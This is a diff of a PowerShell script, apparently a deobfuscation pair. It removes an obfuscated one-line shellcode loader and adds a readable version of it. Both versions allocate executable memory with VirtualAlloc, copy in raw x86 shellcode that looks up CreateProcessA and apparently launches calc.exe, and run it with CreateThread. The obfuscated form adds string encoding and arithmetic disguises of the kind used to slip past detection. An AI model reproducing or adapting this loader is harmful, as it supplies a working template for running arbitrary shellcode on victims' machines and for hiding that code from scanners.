@@ -1,1 +1,28 @@
-function JLDGbLl8{param($PMqnAF2Dh3XZQacQG);$x765JPv2XLGsV6 = [int]$pMQnaF2Dh3XZqacQG[0];$VS2GnASNhSO7NWWk = '';for($xwgOdNtSPc = (1 + 0);$XWGODntSpc -lt $PMQnaF2Dh3XzqacQG.length;$xwGoDNtSpc += (3 - 1)){$VS2gNASnHsO7NwwK += [char](16 * ([int]$PmQNAF2Dh3XZqAcQG[$XwgODnTSpC] - $x765JPv2xLGsV6) + ([int]$PMqnAF2Dh3xZQacQg[$xWGOdNTsPC + 1] - $X765jpV2xlgsV6));}return $VS2GNASnHsO7nWwK;};$ZyOpcFazd = (jlDgbll8('??IDJCCEKEKCHELF?ENFAFCAGAAEJEDFAEMEDEKBBBAAMECEKEKAAAHDL?IF?FDEAEKEHEBA?FBFCE@FCEHEBA?EDFGFCEDFAEMA?CHEMFCD?FCFAA?DEEHFAFCFDE@EKC@EKEKENEBAGCHEMFCD?FCFAA?EKF?C@ECECFAEDFBFBAKA?FDEHEMFCA?ECFFDBEHFIEDAKA?FDEHEMFCA?EEEKC@EKEKENEBE@FCEHENEMDCFHF?EDAKA?FDEHEMFCA?EEEKD?FAENFCEDEBFCAHBJ?I?IDJCCEKEKCHELF?ENFAFCAGAAEJEDFAEMEDEKBBBAAMECEKEKAAAHDL?IF?FDEAEKEHEBA?FBFCE@FCEHEBA?EDFGFCEDFAEMA?CHEMFCD?FCFAA?CBFAEDE@FCEDDCEGFAEDE@ECAGCHEMFCD?FCFAA?EKF?DCEGFAEDE@ECC@FCFCFAEHEAFDFCEDFBAKA?FDEHEMFCA?ECFFDBFCE@EBEJDBEHFIEDAKA?CHEMFCD?FCFAA?EKF?DBFCE@FAFCC@ECECFAEDFBFBAKA?CHEMFCD?FCFAA?EKF?D?E@FAE@ELEDFCEDFAAKA?FDEHEMFCA?ECFFCBFAEDE@FCEHENEMCEEKE@EFFBAKA?CHEMFCD?FCFAA?EKF?DCEGFAEDE@ECCHECAHBJ?I?IDJCCEKEKCHELF?ENFAFCAGAAELFBFEEBFAFCAMECEKEKAAAHDL?I?IF?FDEAEKEHEBA?FBFCE@FCEHEBA?EDFGFCEDFAEMA?CHEMFCD?FCFAA?ELEDELFBEDFCAGCHEMFCD?FCFAA?ECEDFBFCAKA?FDEHEMFCA?FBFAEBAKA?FDEHEMFCA?EBENFDEMFCAHBJ'));$SZrtzGUKcC_JUUz = Add-Type -memberDefinition $ZyopCfAZd -Name ('{2}{1}{0}'-f'2','n3','Wi') -namespace Win32Functions -passthru;[Byte[]];[Byte[]] $Cjx8f5ZUzttwPs = (1 - 1)x31,(0 + 0)xdb,0x64,0x8b,0x7b,(1 - 1)x30,(1 - 1)x8b,0x7f,0x0c,0x8b,(0 + 0)x7f,0x1c,(0 + 0)x8b,0x47,0x08,0x8b,(1 - 1)x77,0x20,(0 + 0)x8b,0x3f,0x80,(0 + 0)x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,0x8b,(1 - 1)x57,(1 - 1)x78,(0 + 0)x01,0xc2,(0 + 0)x8b,0x7a,0x20,(0 + 0)x01,0xc7,0x89,0xdd,0x8b,0x34,0xaf,(0 + 0)x01,0xc6,0x45,0x81,(0 + 0)x3e,0x43,0x72,0x65,0x61,0x75,0xf2,(1 - 1)x81,0x7e,(0 + 0)x08,0x6f,(0 + 0)x63,0x65,(0 + 0)x73,(1 - 1)x75,0xe9,0x8b,0x7a,0x24,0x01,0xc7,(0 + 0)x66,0x8b,(0 + 0)x2c,0x6f,0x8b,(1 - 1)x7a,0x1c,(1 - 1)x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x89,0xd9,0xb1,0xff,0x53,0xe2,0xfd,0x68,0x63,(1 - 1)x61,(1 - 1)x6c,(1 - 1)x63,(0 + 0)x89,0xe2,0x52,0x52,0x53,0x53,0x53,0x53,0x53,0x53,(0 + 0)x52,(1 - 1)x53,(1 - 1)xff,(1 - 1)xd7;$myxwWNH = (0 + 0)x1000;Write-Output $Cjx8F5ZUzttWpS.Length;if ($CJx8f5ZuZTtwpS.Length -gt (1 - 1)x1000) {$myXwWnh = $CJx8f5zUztTWps.Length};$IW0bNvG = $szrtZguKCC_JUUz::VirtualAlloc((1 - 1), $MYXwWnH, (0 + 0)x3000, (0 + 0)x40);for ($xwGODNtsPC=0;$xWgOdNTSPc -le ($cJx8f5zUzTtWps.Length-1);$XWgodnTSpc++) {$sZrtZGuKCc_JUuZ::memset([IntPtr]($iw0bNVG.ToInt32()+$XWGodnTSpc), $Cjx8F5ZUZTtwPs[$XWgodNTsPc], 1)};$szrtZgUkCC_jUUz::CreateThread(0,0,$iw0bNvG,0,(1 - 1),(0 + 0));for (;;) {Start-sleep (70 - 10) };
+
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$func = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]] $buf = 0x31,0xdb,0x64,0x8b,0x7b,0x30,0x8b,0x7f,0x0c,0x8b,0x7f,0x1c,0x8b,0x47,0x08,0x8b,0x77,0x20,0x8b,0x3f,0x80,0x7e,0x0c,0x33,0x75,0xf2,0x89,0xc7,0x03,0x78,0x3c,0x8b,0x57,0x78,0x01,0xc2,0x8b,0x7a,0x20,0x01,0xc7,0x89,0xdd,0x8b,0x34,0xaf,0x01,0xc6,0x45,0x81,0x3e,0x43,0x72,0x65,0x61,0x75,0xf2,0x81,0x7e,0x08,0x6f,0x63,0x65,0x73,0x75,0xe9,0x8b,0x7a,0x24,0x01,0xc7,0x66,0x8b,0x2c,0x6f,0x8b,0x7a,0x1c,0x01,0xc7,0x8b,0x7c,0xaf,0xfc,0x01,0xc7,0x89,0xd9,0xb1,0xff,0x53,0xe2,0xfd,0x68,0x63,0x61,0x6c,0x63,0x89,0xe2,0x52,0x52,0x53,0x53,0x53,0x53,0x53,0x53,0x52,0x53,0xff,0xd7;
+
+$size = 0x1000;
+Write-Output $buf.Length;
+
+if ($sc.Length -gt 0x1000) {$size = $buf.Length};
+
+$x = $func::VirtualAlloc(0, $size, 0x3000, 0x40);
+
+for ($i=0; $i -le ($buf.Length-1); $i++) {$func::memset([IntPtr]($x.ToInt32()+$i), $buf[$i], 1)};
+
+
+$func::CreateThread(0,0,$x,0,0,0);
